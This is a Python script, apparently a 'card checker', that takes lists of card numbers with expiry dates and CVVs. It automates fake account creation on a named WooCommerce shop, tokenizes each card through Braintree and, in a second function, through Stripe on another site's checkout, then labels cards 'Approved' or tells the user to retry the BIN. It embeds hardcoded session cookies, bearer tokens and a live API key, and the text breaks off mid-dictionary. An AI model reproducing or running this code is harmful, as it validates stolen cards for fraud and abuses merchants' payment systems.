import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests


def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/', headers=headers)
	 
	 
	 
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	 
	 
	 
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	data = {
	     'username': username,
	     'email': acc,
	     'password': 'Ah2002Ah!',
	     'woocommerce-register-nonce': register,
	     '_wp_http_referer': '/my-account/',
	     'register': 'Register',
	 }
	 
	response = r.post('https://www.thevacuumfactory.com/my-account/', headers=headers, data=data)
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	 
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	import requests
	
	cookies = {
	    '_ga': 'GA1.1.947412816.1719867681',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-07-01%2021%3A01%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-07-01%2021%3A01%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
	    '_swa_u': 'f7edc551-7619-4fce-a05f-7b52df4059fd',
	    '_gcl_au': '1.1.1252383508.1719867684',
	    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'wordpress_test_cookie': 'WP%20Cookie%20check',
	    'wordpress_logged_in_5a9b1c4730164376cc88c4f3afed3405': 'jsidjeiw9aosk%7C1721082155%7CtGGgzu8Gf0T5eMz8eweY5AMXnHZqGbgQQDErkhBS1xD%7C59a99a6746f8d065437383ac6745e0e07110821d17a2bd8c41f6e5f86d91eeb9',
	    'sbjs_session': 'pgs%3D26%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
	    '_ga_3S1SBY244N': 'GS1.1.1719871147.2.1.1719872678.0.0.0',
	}
	
	headers = {
	    'authority': 'www.thevacuumfactory.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': '_ga=GA1.1.947412816.1719867681; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-01%2021%3A01%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-01%2021%3A01%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; _swa_u=f7edc551-7619-4fce-a05f-7b52df4059fd; _gcl_au=1.1.1252383508.1719867684; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_5a9b1c4730164376cc88c4f3afed3405=jsidjeiw9aosk%7C1721082155%7CtGGgzu8Gf0T5eMz8eweY5AMXnHZqGbgQQDErkhBS1xD%7C59a99a6746f8d065437383ac6745e0e07110821d17a2bd8c41f6e5f86d91eeb9; sbjs_session=pgs%3D26%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thevacuumfactory.com%2Fmy-account%2Fedit-address%2Fbilling%2F; _ga_3S1SBY244N=GS1.1.1719871147.2.1.1719872678.0.0.0',
	    'origin': 'https://www.thevacuumfactory.com',
	    'referer': 'https://www.thevacuumfactory.com/my-account/edit-address/billing/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'billing_first_name': 'HSONA',
	    'billing_last_name': 'Aio',
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': 'New york',
	    'billing_address_2': '',
	    'billing_city': 'New york',
	    'billing_state': 'NY',
	    'billing_postcode': '10080',
	    'billing_phone': '5032580987',
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/my-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post(
	    'https://www.thevacuumfactory.com/my-account/edit-address/billing/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	 
	
	
	
	 
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	 
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	 
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	 
	 
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	  
	data = {
	      'action': 'wc_braintree_credit_card_get_client_token',
	      'nonce': client,
	 }
	  
	response = r.post('https://www.thevacuumfactory.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	 
	enc = response.json()['data']
	 
	dec = base64.b64decode(enc).decode('utf-8')
	 
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	 
	 
	  
	headers = {
	      'authority': 'payments.braintree-api.com',
	      'accept': '*/*',
	      'authorization': f'Bearer {au}',
	      'braintree-version': '2018-05-10',
	      'cache-control': 'no-cache',
	      'content-type': 'application/json',
	      'pragma': 'no-cache',
	      'user-agent': user,
	  }
	  
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'a8a54511-3469-4ac4-aae6-1b4ce202e438',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	  
	 
	try:
	  tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
	  return
	  
	 
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	 }
	  
	data = {
	      'payment_method': 'braintree_credit_card',
	      'wc-braintree-credit-card-card-type': 'master-card',
	      'wc-braintree-credit-card-3d-secure-enabled': '',
	      'wc-braintree-credit-card-3d-secure-verified': '',
	      'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	      'wc_braintree_credit_card_payment_nonce': tok,
	      'wc_braintree_device_data': '',
	      'wc-braintree-credit-card-tokenize-payment-method': 'true',
	      'woocommerce-add-payment-method-nonce': add_nonce,
	      '_wp_http_referer': '/my-account/add-payment-method/',
	      'woocommerce_add_payment_method': '1',
	  }
	  
	response = r.post('https://www.thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
				
			
		
		
		
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
#Strip CH	
	
def stripe(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = f'type=card&billing_details[name]=yusuf&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=bf6d1134-90bb-47eb-b27c-cfc553d0d0275e6fb4&muid=ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5&sid=e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=26722&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZCW7j7pIUIasVSFAhqmDTpFl1MOc3hCNLeTdMbXXZDXJtc7EEBdupR-viL6YJAe666AFogrL2w_Z_jeeq_WrrWz9DU95GeMgduzRcqsJ4ZQ_B28EBX6EdZGAP8X-QMFabUEqf3A_92-8Kf3pwCOMCcJoGtNZ54AjbjiW0fDIgiuDys_FzfbpM98wbcHYau6mvUBA0e3siBypNANfVlpuJ2WNlRnqwSGCD_jMUgOXF1dlNBPsWZf8tfJxMZjnP2hxTIhMjtxK2AgFXjGnC9Uzsf-ukzOqWuAcW1wuwUpIbKKg-I2V1hdu9H7hKlMUqpiafuXwTIGo3uV26RB-0wgpxfxCDcNw_2gju90MNok3n9SGvdJsUvdnE4IPXXGpoHoOZsXYhHDKVv1UgrdpRRZ1-YtBqZU-4CXqFRJqc3WJY4QsyLc_z604Wj71bNdraah6JYUDpVWbQbhRrECyCXzNAuh39fOGePihu29ZddIEJ2mVS4ywX9mFP9AQIYruW-TpIH0Z_gBEOMNYNthQPpSuhwD70otqxo8Z8YWaGbr0oz-gUGfeXdvddhssZ_btpwWpoBPPdtzgKJDJ8ddYm8Hw6rPsDCgeKBE9z_UD4gEmBQAEyh5MXzszB6RZDTzXDVSjdRP8jmxdIETr6JWBs5Yj-swDfvd8k39oyPjPwb-u7qV8E5wUWErU-VlmqKNhxSsPioAMmq8JCqs5cYEro551dTO___JAbHEO4cDkBO0sV_JEtk_bk1GhlsHoHd9r-KaQgzvyO1bc8bMIAoS1u7DdaJbyko_tSC_1YdU_yapn0QioKl-oNt3Gp9c6eSOSHh-_xWYgKONQnxsvGh9JPsHLGPeUTV5ENIVB_K0ho8tVuYhaDJgp_55DKf2DjFFIkWWONxze9k7hpcgIbAAP9geqKmDe22mVW65V8zi6XcYKxqh14IGpPBof1Qw9bg63BmdHyURpUnuzhVeIy5hlj6AUCf1DrenRP5P7N3S8ZcDCELdNKLPWw0MbmaPxeTiME6__aPv7UhywP4VpyvanP3g8x2z9i9CWDoUbXi5opRf6amMq5QBxom3-bIOiZ5r9YgVyky4NJTGHUzRdX54YAOlCU1NE5Ja-oZQTd_ZwqdwhdOZIx6Ohs2eM-6dCwZDxxV6YZBs18FsPaXfQcPg4FKCpC83YlS8lUqaDjpeTzwzH1fahftakgDQTXxHd-62RWZ_SIcBZNDKOmrYp1-yGdFDRU_Mi70rQGFV0I94ffINMzgoVnUeufZ7mUI6XXnY8AUJhyiGJK2eRK0k3oeyDCm5CXy-4wqLJHYKRbGtTqaD9OMeYrBtRYymuUrMeKce-L845X_BJc4eG1ZIxMbx4bpdxhBrpplb3jSaEMywT3oyvRxbQ3El72cyPCR_qeqDP0qsBk98pyrQdF6g8D8_nxtRChhNzDF-X6VLCmXeYU9t9-bWcgz-KLPVOdRnHt_TG2Ks4gqPjqpFMkSl1zM0vtv9KJ-IEwjZdA11r75ZGsrV5Fnyr5nXyMzw5jAO8h8bSwYrCAfk4IKnhcFiy_gymuVFGW5QMrZWDeZ65KS6bzNH96KAapgTH9Mz4SzuffJ_mTR9jtj4xQkZkYXCsAdJNyywUDxU8Cs_kKgx99aD2zKEhKTJnuzR8B9igZRrHXPTSl5qzfx3A9uIRGq_1RSzrY0ryINfuIEYUAYO8D8gfD6nqW1JP9W9tWTl0CtdIolnbROW0jZGyXGdgAREP4HeNO5AlQVO_lqeJcVMEkIlUvIFDWJIfnJX0i04r_dkWmRrTD4Vsxzo9VJ2gcYNax47IzFy39pylB5tvn-RMqCZ1jOdxinqnihRRyx33sODLSExvjb75saIxJl73YAb_3C_8W8AFCYMIR7ifZQsyyedZJIJkBlb01ody9eS9uKPwUGVmDxKXzV0ErDzq290JOPuKrbYo0i2hBqw9OqkbuXkdcgMd3GJpUeEqLgGBiInTEafQwrvPSefCHhK-fXo_J7Hqx-bMYPjYimWEI_7zXJWA3dg_hw1O8gZel8vsy5JMgjeBFg7vb9svzaO9f9im4X6_FUgEczenMJyX_GsDJ4BH4KIS9t8uPwEBosa4vjAX257benu0lZAWO1EkS7IBImfgDptyB2JM4Co2V4cM5mVf7XqHNoYXJkX2lkzhQ8hB-ia3KnYTZhOWNjYaJwZAA.4L5u6H3jmOK658HDQbM2pr46esOmTm84BOlgILEozLE'

	reso = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	cookies = {
    'ahoy_visitor': 'aa9059eb-6025-4c9c-8c93-06b2e7f66bf1',
    'ahoy_visit': '80f8e7d9-33d9-4a44-a389-d3886d799439',
    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%2C%22consentId%22%3A%2208a387aa-0eaa-4cea-a8f8-01818d60d128%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%7D',
    '_gcl_au': '1.1.191496317.1716898280',
    '_gid': 'GA1.2.1548126584.1716898280',
    'remember_user_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3',
    'unsecure_is_signed_in': '1',
    '_cioid': '11296645',
    'intercom-device-id-frdatdus': '65896fd8-9074-419f-82af-44775a9800f5',
    '__stripe_mid': 'ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5',
    '__stripe_sid': 'e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d',
    '_gat_UA-97995424-1': '1',
    '_ga': 'GA1.1.1213546217.1716898279',
    '_ga_4T8KCV9Y2D': 'GS1.1.1716911386.2.1.1716911702.60.0.0',
    'intercom-session-frdatdus': 'WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d',
    '_transcribe_session': 'GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7i9hGPm8d%2F%2BvqYGQ2QPMPZYvQ34snlJ8u%2FbZ%2FTJIQGhejj5W3p3Ow%3D%3D--fnFcV2OENluq4BD%2B--KIoAKM2gNf00FVX7WVRRMA%3D%3D',
}

	headers = {
    'authority': 'www.happyscribe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer OQRJtXO8dyPUQ3DMs8deCgtt',
    'content-type': 'application/json',
    # 'cookie': 'ahoy_visitor=aa9059eb-6025-4c9c-8c93-06b2e7f66bf1; ahoy_visit=80f8e7d9-33d9-4a44-a389-d3886d799439; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%2C%22consentId%22%3A%2208a387aa-0eaa-4cea-a8f8-01818d60d128%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-05-28T12%3A11%3A20.214Z%22%7D; _gcl_au=1.1.191496317.1716898280; _gid=GA1.2.1548126584.1716898280; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3; unsecure_is_signed_in=1; _cioid=11296645; intercom-device-id-frdatdus=65896fd8-9074-419f-82af-44775a9800f5; __stripe_mid=ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5; __stripe_sid=e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d; _gat_UA-97995424-1=1; _ga=GA1.1.1213546217.1716898279; _ga_4T8KCV9Y2D=GS1.1.1716911386.2.1.1716911702.60.0.0; intercom-session-frdatdus=WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d; _transcribe_session=GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7i9hGPm8d%2F%2BvqYGQ2QPMPZYvQ34snlJ8u%2FbZ%2FTJIQGhejj5W3p3Ow%3D%3D--fnFcV2OENluq4BD%2B--KIoAKM2gNf00FVX7WVRRMA%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'referer': 'https://www.happyscribe.com/v2/10807386/checkout?new_subscription_interval=month&plan=pro_2023_05_01&step=billing_details',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'id': 10486458,
    'address': '9350 N Central Expy',
    'name': 'yusuf',
    'country': 'US',
    'vat': None,
    'billing_account_id': 10486458,
    'last4': '9305',
    'orderReference': 'nljannd',
    'user_id': 11296645,
    'organization_id': 10807386,
    'hours': 0,
    'balance_increase_in_cents': None,
    'payment_method_id': ide,
    'transcription_id': None,
    'plan': 'pro_2023_05_01',
    'order_id': None,
    'recurrence_interval': 'month',
